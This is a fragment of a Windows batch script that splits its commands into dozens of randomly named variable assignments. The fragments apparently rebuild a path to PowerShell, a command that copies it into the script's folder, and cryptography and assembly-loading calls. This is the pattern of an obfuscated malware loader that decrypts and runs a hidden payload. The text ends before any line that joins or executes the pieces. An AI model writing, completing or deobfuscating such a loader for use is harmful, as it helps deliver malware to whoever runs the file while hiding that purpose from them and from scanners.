@echo off
set "HuirenAiMU=\W"
set "xoHpxfAzdO=ll"
set "GhIdYbsmpF=he"
set "apIAMBkepe=:\"
set "brOjVmHUme=32"
set "fhEBTMmmGX=Po"
set "pDwxiYjUGX=co"
set "jGGpmEQJsb=Wi"
set "nvNyCNcqWg=1."
set "ikNQuKunNX=ll"
set "LBEZrSUuVt=Sy"
set "ujZIktwbjL= /"
set "LhvoFsPZAG=nd"
set "IbzxrMwonH=we"
set "CCYcruxuNe=do"
set "PgvIEhzQyh=rS"
set "herGmIUwKl=.e"
set "sXNxWBkXac= C"
set "ybhyMCQbQp=y "
set "JFxBBewgZJ=we"
set "wdBOaBtvyp=xe"
set "PMYCCGprwS=em"
set "NldAjXpOIG=po"
set "NlTEWCPeLQ=ow"
set "ZofBCYDbwK=in"
set "YxGOzYMWXL=\v"
set "zeRdSMqylr=s\"
set "uWDhFvXwjE=he"
set "MlDJqXMcsK=st"
set "SyExrKjhib=py"
set "HerHQYBlnU=rs"
set "qSPocuDGyo=ws"
set "gZWvBEsEoU=0\"
set "gXYstDZnaC= %~dp0"
set "zSHWqjiFnJ=cd"
set "kntvuqqsJp=DpY."
set "OsZfLwOLOw=)) {"
set "oIVdxRoJMJ=7Yiv"
set "ygGgHoBFvI=gKL "
set "MBXVUckstb=embl"
set "BlKYHvJmxW=rt]:"
set "LHFVbcSjaL=('%*'"
set "SKdUiSOMRo=pose"
set "nMmdLPNUJW=.Cry"
set "ygCtmzxUaF=yc.T"
set "JguxQjlNGy=ode]"
